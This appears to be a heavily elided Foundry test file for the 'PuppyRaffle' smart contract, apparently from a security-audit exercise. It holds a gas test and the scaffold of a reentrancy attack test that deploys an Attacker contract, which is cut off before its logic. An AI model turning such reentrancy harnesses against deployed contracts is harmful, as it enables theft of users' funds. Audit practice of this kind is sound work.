...
contract PuppyRaffleTest is Test {
    ...
    function testGas_WhenEnteringRaffle() public {
        address[] memory players = new address[](1);
        ...
        for (uint256 i = 0; i < 100; i++) {
            ...
            puppyRaffle.enterRaffle{value: entranceFee, gas: 1 ether}(players);
        }
        players[0] = makeAddr("playerTwo");
        gasBefore = gasleft();
    ...
    function testAttack_Reentrancy() public {
        vm.deal(address(puppyRaffle), 100 ether);
        Attacker attacker = new Attacker{value: 1 ether}(address(puppyRaffle));
        attacker.attack();
...
contract Attacker {
    ...
    constructor(address _puppyRaffle) payable {
